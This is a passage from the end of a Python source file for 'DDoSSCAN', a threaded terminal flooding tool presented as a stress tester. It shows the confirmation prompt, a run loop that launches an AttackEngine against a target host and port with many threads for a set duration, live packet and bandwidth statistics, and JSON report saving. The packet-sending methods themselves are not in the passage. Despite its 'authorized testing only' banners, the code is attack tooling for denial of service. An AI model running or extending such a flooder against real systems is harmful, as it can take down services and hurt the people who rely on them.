        hdr("CLEAR REPORTS"); box_emp(); box_bot()
        import glob
        files = glob.glob("ddosscan_report_*.json") + glob.glob("ddosscan_report_*.txt")
        print()
        if not files: info("No report files found")
        else:
            for f in files: os.remove(f); ok(f"Deleted: {f}")
        pause()

    # ── CONFIRM & RUN ────────────────────────────────────────
    def _confirm_and_run(self):
        print()
        box_top("CONFIRM BEFORE START")
        box_emp()
        box_kv("Target",   f"{self.target}:{self.port}")
        box_kv("Method",   self.method.upper())
        box_kv("Threads",  str(self.threads))
        box_kv("Duration", f"{self.duration}s ({self.duration/60:.1f} menit)")
        box_kv("Est. Req", f"{self.threads * self.duration * 0.75:,.0f}")
        box_emp()
        _row(f"  {Fore.RED}⚠  Ensure you have permission to test this target!{Style.RESET_ALL}")
        box_emp(); box_bot()

        confirm = inp("\nType CONFIRM to start (anything else = cancel)", "")
        if confirm.upper() != "CONFIRM":
            warn("Test cancelled."); time.sleep(1); return

        self._run()

    # ── RUN ENGINE ───────────────────────────────────────────
    def _run(self):
        lock   = threading.Lock()
        engine = AttackEngine(self.target, self.port, self.method, lock)
        engine.running = True

        print(f"\n{Fore.RED}{'═'*70}{Style.RESET_ALL}")
        info(f"Starting stress test  →  {Fore.YELLOW}{self.target}:{self.port}{Style.RESET_ALL}")
        info(f"Method: {self.method.upper()}   Threads: {self.threads}   Duration: {self.duration}s")
        print(f"{Fore.RED}{'═'*70}{Style.RESET_ALL}\n")

        # Launch threads
        fn = engine.get_fn()
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = [ex.submit(fn) for _ in range(self.threads)]
            start = time.time()

            # Live stats loop
            try:
                while engine.running:
                    elapsed = time.time() - start
                    if elapsed >= self.duration:
                        engine.running = False; break
                    prog  = (elapsed / self.duration) * 100
                    bar   = "█" * int(prog / 5) + "░" * (20 - int(prog / 5))
                    rate  = engine.packets / max(elapsed, 1)
                    sys.stdout.write(
                        f"\r  {Fore.CYAN}[{bar}]{Style.RESET_ALL} {prog:.1f}%  "
                        f"{Fore.GREEN}pkts:{engine.packets:,}{Style.RESET_ALL}  "
                        f"{Fore.YELLOW}ok:{engine.success:,}{Style.RESET_ALL}  "
                        f"{Fore.MAGENTA}{rate:.0f}/s{Style.RESET_ALL}  "
                        f"{Style.DIM}{int(elapsed):03d}/{self.duration}s{Style.RESET_ALL}"
                    )
                    sys.stdout.flush()
                    time.sleep(0.5)
            except KeyboardInterrupt:
                engine.running = False
                warn("\nTest dihentikan manual.")

        elapsed = time.time() - start
        engine.running = False
        time.sleep(0.5)

        # Build result
        sr = (engine.success / max(engine.packets, 1)) * 100
        result = {
            'session':      S.id,
            'timestamp':    datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'target':       self.target,
            'port':         self.port,
            'method':       self.method,
            'threads':      self.threads,
            'duration_sec': round(elapsed, 1),
            'packets':      engine.packets,
            'success':      engine.success,
            'errors':       engine.errors,
            'avg_rate':     round(engine.packets / max(elapsed, 1), 1),
            'est_bw':       round((engine.packets * 1000 * 8) / max(elapsed * 1_000_000, 1), 2),
            'success_rate': round(sr, 1),
        }
        self.last_result = result
        S.save(result)

        # Final stats
        print(f"\n\n{Fore.GREEN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{Style.BRIGHT}  STRESS TEST COMPLETE{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'═'*70}{Style.RESET_ALL}\n")
        ok(f"Duration     : {elapsed:.1f}s")
        ok(f"Total Packets: {engine.packets:,}")
        ok(f"Successful   : {engine.success:,}")
        ok(f"Errors       : {engine.errors:,}")
        ok(f"Avg Rate     : {result['avg_rate']} pkt/s")
        ok(f"Est. BW Used : {result['est_bw']} Mbps")
        ok(f"Success Rate : {sr:.1f}%")

        # Auto save JSON
        fn = Reporter.save_json(result)
        print(f"\n  {Style.DIM}Report auto-saved: {fn}{Style.RESET_ALL}")
        pause()

# ==================== ENTRY ====================
def main():
    try:
        clr(); print(LOGO)
        print(f"  {Fore.RED}{Style.BRIGHT}⚠  AUTHORIZED TESTING ONLY  —  ILLEGAL USE = PRISON TIME  ⚠{Style.RESET_ALL}\n")
        time.sleep(1.5)
        boot()
        DDoSSCAN().main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}  Program terminated.{Style.RESET_ALL}\n"); sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}  Fatal: {e}{Style.RESET_ALL}"); sys.exit(1)

if __name__ == "__main__":
    main()
